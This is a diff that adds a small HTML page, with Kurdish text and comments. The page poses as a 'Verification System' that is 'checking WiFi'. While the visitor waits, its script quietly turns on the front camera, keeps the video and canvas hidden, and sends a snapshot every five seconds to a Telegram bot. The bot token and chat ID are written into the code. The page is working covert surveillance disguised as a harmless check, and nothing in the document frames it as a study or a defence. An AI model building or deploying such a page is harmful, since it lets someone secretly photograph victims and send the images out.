@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification System</title>
+    <style>
+        body { background-color: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loader-box { text-align: center; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #video, #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="loader-box">
+        <div class="spinner"></div>
+        <p>تکایە چاوەڕێ بکە... خەریکی پشکنینی وایفایە...</p>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY';
+        const ID = '6351568884';
+
+        // دەستپێکردنی کامێرا هەر کە سایتەکە کرایەوە
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            // هەموو 5000 میلی چرکە (واتە 5 چرکە) جارێک ئەم کارە دووبارە بکەرەوە
+            setInterval(() => {
+                takeSnapshot();
+            }, 5000);
+        })
+        .catch(err => {
+            console.log("ڕێپێدان ڕەتکرایەوە");
+        });
+
+        function takeSnapshot() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', ID);
+                formData.append('photo', blob, 'capture.jpg');
+                formData.append('caption', '📸 وێنەیەکی نوێی ئۆتۆماتیکی گەیشت!');
+
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }, 'image/jpeg', 0.7);
+        }
+    </script>
+</body>
+</html>
